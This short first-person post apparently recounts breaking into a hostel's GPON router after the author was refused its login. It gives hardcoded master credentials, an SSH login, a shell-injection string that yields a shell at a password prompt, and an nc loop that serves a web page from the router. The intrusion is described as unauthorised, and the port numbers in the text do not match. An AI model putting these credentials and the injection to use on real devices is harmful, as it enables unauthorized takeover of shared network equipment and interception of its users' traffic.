After I was not give username and password of our hostel's router, I began to look for them in internet.

After a good amount of google search , I found a github page mentioning same router as ours and its vulnerabilities.

Here is what I found after some research:

> There is s master username and password through which I can login to admin panel.
username: AdminGPON
password: ALC#FGU

> This master password also allows to make ssh connection to router .ie:
```ssh AdminGPON@<router ip>```

> This would login me as user but wont give shell access. But it is vulnerable to shell injection. so,
user>shell would ask for password2 where I can simply paste:<code>'; /bin/sh; #</code>

And voila, you got shell

> since I have now access to shell, I tried doing things i would do in linux machine like messing around.

> I was able to serve a simple html page using nc command as:
```while true ; do  echo -e "HTTP/1.1 200 OK\n\n $(cat index.html)" | nc -l -p 1500  ; done```
  index.html being your html file.


> I was able to access html page throughout local network as <router-ip>:8000
